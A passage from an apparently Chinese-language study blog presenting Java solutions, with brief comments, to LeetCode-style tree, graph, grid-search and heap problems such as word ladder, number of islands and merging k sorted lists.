<h3 id="113-路径总和-II"><a href="#113-路径总和-II" class="headerlink" title=" 113. 路径总和 II"></a><a href="https://leetcode-cn.com/problems/path-sum-ii"> 113. 路径总和 II</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">pathSum</span><span class="params">(TreeNode root, <span class="type">int</span> targetSum)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        dfs(root, res, path, targetSum);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(TreeNode root, List&lt;List&lt;Integer&gt;&gt; res, List&lt;Integer&gt; path, <span class="type">int</span> targetSum)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        path.add(root.val);</span><br><span class="line">        targetSum -= root.val;</span><br><span class="line">        <span class="keyword">if</span> (root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span> &amp;&amp; targetSum == <span class="number">0</span>) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">        &#125;</span><br><span class="line">        dfs(root.left, res, path, targetSum);</span><br><span class="line">        dfs(root.right, res, path, targetSum);</span><br><span class="line">        path.remove(path.size() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="958-二叉树的完全性检验"><a href="#958-二叉树的完全性检验" class="headerlink" title=" 958. 二叉树的完全性检验"></a><a href="https://leetcode-cn.com/problems/check-completeness-of-a-binary-tree"> 958. 二叉树的完全性检验</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isCompleteTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        LinkedList&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span> ((cur = queue.poll()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            queue.add(cur.left);</span><br><span class="line">            queue.add(cur.right);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (queue.poll() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="129-求根到叶子节点数字之和"><a href="#129-求根到叶子节点数字之和" class="headerlink" title="129. 求根到叶子节点数字之和"></a><a href="https://leetcode-cn.com/problems/sum-root-to-leaf-numbers">129. 求根到叶子节点数字之和</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sumNumbers</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        dfs(root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(TreeNode root, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> (val * <span class="number">10</span> + root.val);</span><br><span class="line">        <span class="keyword">if</span> (root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">            sum += k;</span><br><span class="line">        &#125;</span><br><span class="line">        dfs(root.left, k);</span><br><span class="line">        dfs(root.right, k);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><h3 id="127-单词接龙"><a href="#127-单词接龙" class="headerlink" title="127. 单词接龙"></a><a href="https://leetcode-cn.com/problems/word-ladder/">127. 单词接龙</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// BFS</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">ladderLength</span><span class="params">(String beginWord, String endWord, List&lt;String&gt; wordList)</span> &#123;</span><br><span class="line"></span><br><span class="line">        HashSet&lt;String&gt; wordSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(wordList);</span><br><span class="line">        <span class="keyword">if</span> (wordSet.size() == <span class="number">0</span> || !wordSet.contains(endWord)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        LinkedList&lt;String&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.offer(beginWord);</span><br><span class="line">        HashSet&lt;String&gt; visited = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        visited.add(beginWord);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">currrentSize</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; currrentSize; i++) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">curWord</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                <span class="keyword">if</span> (bfs(curWord, endWord, wordSet, visited, queue)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> size + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            size++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">bfs</span><span class="params">(String curWord, String endWord, HashSet&lt;String&gt; wordSet, HashSet&lt;String&gt; visited, LinkedList&lt;String&gt; queue)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; endWord.length(); i++) &#123;</span><br><span class="line">            <span class="type">char</span>[] cur = curWord.toCharArray();</span><br><span class="line">            <span class="type">char</span> <span class="variable">originChar</span> <span class="operator">=</span> cur[i];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> <span class="variable">j</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span>; j &lt;= <span class="string">&#x27;z&#x27;</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j == originChar) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                cur[i] = j;</span><br><span class="line">                <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> String.valueOf(cur);</span><br><span class="line">                <span class="keyword">if</span> (wordSet.contains(temp)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (temp.equals(endWord)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (!visited.contains(temp)) &#123;</span><br><span class="line">                        visited.add(temp);</span><br><span class="line">                        queue.offer(temp);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">			cur[i] = originChar;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 双向BFS, 知道起点和终点即可用双向</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">ladderLength</span><span class="params">(String beginWord, String endWord, List&lt;String&gt; wordList)</span> &#123;</span><br><span class="line">       Set&lt;String&gt; wordSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(wordList);</span><br><span class="line">       <span class="keyword">if</span> (wordSet.size() == <span class="number">0</span> || !wordSet.contains(endWord)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       Set&lt;String&gt; visited = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">       Set&lt;String&gt; beginVisited = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">       Set&lt;String&gt; endVisited = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">       beginVisited.add(beginWord);</span><br><span class="line">       endVisited.add(endWord);</span><br><span class="line">       <span class="type">int</span> <span class="variable">step</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">       <span class="keyword">while</span> (!beginVisited.isEmpty() &amp;&amp; !endVisited.isEmpty()) &#123;</span><br><span class="line">           <span class="keyword">if</span> (beginVisited.size() &gt; endVisited.size()) &#123;</span><br><span class="line">               Set&lt;String&gt; temp = beginVisited;</span><br><span class="line">               beginVisited = endVisited;</span><br><span class="line">               endVisited = temp;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           Set&lt;String&gt; nextLevel = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">           <span class="keyword">for</span> (String word :</span><br><span class="line">                   beginVisited) &#123;</span><br><span class="line">               <span class="keyword">if</span> (bfs(word, endVisited, visited, wordSet, nextLevel)) &#123;</span><br><span class="line">                   <span class="keyword">return</span> step + <span class="number">1</span>;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line">           beginVisited = nextLevel;</span><br><span class="line">           step++;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">bfs</span><span class="params">(String word, Set&lt;String&gt; endVisited, Set&lt;String&gt; visited, Set&lt;String&gt; wordSet, Set&lt;String&gt; nextLevel)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] s = word.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; word.length(); i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">originChar</span> <span class="operator">=</span> s[i];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> <span class="variable">j</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span>; j &lt;= <span class="string">&#x27;z&#x27;</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j == originChar) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                s[i] = j;</span><br><span class="line">                <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> String.valueOf(s);</span><br><span class="line">                <span class="keyword">if</span> (wordSet.contains(temp)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (endVisited.contains(temp)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (!visited.contains(temp)) &#123;</span><br><span class="line">                        nextLevel.add(temp);</span><br><span class="line">                        visited.add(temp);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            s[i] = originChar;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="剑指-Offer-12-矩阵中的路径"><a href="#剑指-Offer-12-矩阵中的路径" class="headerlink" title="剑指 Offer 12. 矩阵中的路径"></a><a href="https://leetcode-cn.com/problems/ju-zhen-zhong-de-lu-jing-lcof/">剑指 Offer 12. 矩阵中的路径</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">exist</span><span class="params">(<span class="type">char</span>[][] board, String word)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (board == <span class="literal">null</span> || board.length == <span class="number">0</span> || board[<span class="number">0</span>].length == <span class="number">0</span>  || word == <span class="literal">null</span> || <span class="string">&quot;&quot;</span>.equals(word)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">char</span>[] wc = word.toCharArray();</span><br><span class="line">        <span class="type">boolean</span>[][] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[board.length][board[<span class="number">0</span>].length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; board.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; board[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">               <span class="keyword">if</span> (dfs(board, i, j, visited, wc, <span class="number">0</span>)) &#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">boolean</span>[][] visited, <span class="type">char</span>[] wc, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i == board.length || j &lt; <span class="number">0</span> || j == board[<span class="number">0</span>].length || visited[i][j] || board[i][j] != wc[start]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (wc.length - <span class="number">1</span> == start) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[i][j] = <span class="literal">true</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">res</span> <span class="operator">=</span> dfs(board, i + <span class="number">1</span>, j, visited, wc, start + <span class="number">1</span>)</span><br><span class="line">                || dfs(board, i - <span class="number">1</span>, j, visited, wc, start + <span class="number">1</span>)</span><br><span class="line">                || dfs(board, i, j + <span class="number">1</span>, visited, wc, start + <span class="number">1</span>)</span><br><span class="line">                || dfs(board, i, j - <span class="number">1</span>, visited, wc, start + <span class="number">1</span>);</span><br><span class="line">        visited[i][j] = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="剑指-Offer-13-机器人的运动范围"><a href="#剑指-Offer-13-机器人的运动范围" class="headerlink" title="剑指 Offer 13. 机器人的运动范围"></a><a href="https://leetcode-cn.com/problems/ji-qi-ren-de-yun-dong-fan-wei-lcof/">剑指 Offer 13. 机器人的运动范围</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">movingCount</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span>[][] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[m][n];</span><br><span class="line">        <span class="keyword">return</span> dfs(<span class="number">0</span>, <span class="number">0</span>, m, n, k, visited);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> m, <span class="type">int</span> n, <span class="type">int</span> k, <span class="type">boolean</span>[][] visited)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= m || j &lt; <span class="number">0</span> || j &gt;= n || (i/<span class="number">10</span> + i%<span class="number">10</span> + j/<span class="number">10</span> + j%<span class="number">10</span>) &gt; k || visited[i][j]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[i][j] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> dfs(i + <span class="number">1</span>, j, m, n, k, visited) + dfs(i, j + <span class="number">1</span>, m, n, k, visited)</span><br><span class="line">                + dfs(i - <span class="number">1</span>, j, m, n, k, visited) + dfs(i, j - <span class="number">1</span>, m, n, k, visited) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="200-岛屿数量"><a href="#200-岛屿数量" class="headerlink" title=" 200. 岛屿数量"></a><a href="https://leetcode-cn.com/problems/number-of-islands"> 200. 岛屿数量</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numIslands</span><span class="params">(<span class="type">char</span>[][] grid)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">landNum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; grid.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; grid[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                    infect(grid, i, j);</span><br><span class="line">                    landNum++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> landNum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">infect</span><span class="params">(<span class="type">char</span>[][] grid, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= grid.length || j &lt; <span class="number">0</span> || j &gt;= grid[<span class="number">0</span>].length || grid[i][j] != <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        grid[i][j] = <span class="number">2</span>;</span><br><span class="line">        infect(grid, i + <span class="number">1</span>, j);</span><br><span class="line">        infect(grid, i - <span class="number">1</span>, j);</span><br><span class="line">        infect(grid, i, j + <span class="number">1</span>);</span><br><span class="line">        infect(grid, i, j - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><h3 id="215-数组中的第K个最大元素-x2F"><a href="#215-数组中的第K个最大元素-x2F" class="headerlink" title="215. 数组中的第K个最大元素&#x2F;"></a><a href="https://leetcode-cn.com/problems/kth-largest-element-in-an-array/">215. 数组中的第K个最大元素</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//从heapSize / 2开始往上堆化</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findKthLargest</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">heapSize</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        buildMaxHeap(nums, heapSize);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            swap(nums, <span class="number">0</span>, heapSize - <span class="number">1</span>);</span><br><span class="line">            heapSize--;</span><br><span class="line">            maxHeapify(nums, <span class="number">0</span>, heapSize);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">maxHeapify</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> i, <span class="type">int</span> heapSize)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> i * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> i * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> i;</span><br><span class="line">        <span class="keyword">if</span> (l &lt; heapSize &amp;&amp; nums[l] &gt; nums[max]) &#123;</span><br><span class="line">            max = l;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (r &lt; heapSize &amp;&amp; nums[r] &gt; nums[max]) &#123;</span><br><span class="line">            max = r;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (max != i) &#123;</span><br><span class="line">            swap(nums, i, max);</span><br><span class="line">            maxHeapify(nums, max, heapSize);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">buildMaxHeap</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> heapSize)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> heapSize / <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            maxHeapify(nums, i, heapSize);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> nums[a];</span><br><span class="line">        nums[a] = nums[b];</span><br><span class="line">        nums[b] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="23-合并K个升序链表-x2F-x2F"><a href="#23-合并K个升序链表-x2F-x2F" class="headerlink" title="23. 合并K个升序链表&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/merge-k-sorted-lists/">23. 合并K个升序链表</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用堆</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">mergeKLists</span><span class="params">(ListNode[] lists)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (lists.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        PriorityQueue&lt;ListNode&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((x, y)-&gt; x.val - y.val);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        dummy.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tail</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; lists.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lists[i] != <span class="literal">null</span>) &#123;</span><br><span class="line">                pq.add(lists[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!pq.isEmpty()) &#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">node</span> <span class="operator">=</span> pq.poll();</span><br><span class="line">            tail.next = node;</span><br><span class="line">            tail = tail.next;</span><br><span class="line">            <span class="keyword">if</span> (node.next != <span class="literal">null</span>) &#123;</span><br><span class="line">                pq.add(node.next);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="347-前-K-个高频元素"><a href="#347-前-K-个高频元素" class="headerlink" title="347. 前 K 个高频元素"></a><a href="https://leetcode-cn.com/problems/top-k-frequent-elements/">347. 前 K 个高频元素</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// topk （前k大）用小根堆，维护堆大小不超过 k 即可。每次压入堆前和堆顶元素比较，如果比堆顶元素还小，直接扔掉，否则压入堆。检查堆大小是否超过 k，如果超过，弹出堆顶。复杂度是 nlogk</span></span><br><span class="line"><span class="comment">// 避免使用大根堆，因为你得把所有元素压入堆，复杂度是 nlogn，而且还浪费内存。如果是海量元素，那就挂了。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] topKFrequent(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        HashMap&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            map.put(num, map.getOrDefault(num, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        PriorityQueue&lt;Integer&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((x, y) -&gt; map.get(x) - map.get(y));</span><br><span class="line">        <span class="keyword">for</span> (Integer key :</span><br><span class="line">                map.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pq.size() &lt; k) &#123;</span><br><span class="line">                pq.add(key);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (map.get(pq.peek()) &lt; map.get(key)) &#123;</span><br><span class="line">                pq.remove();</span><br><span class="line">                pq.add(key);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[k];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> k - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> 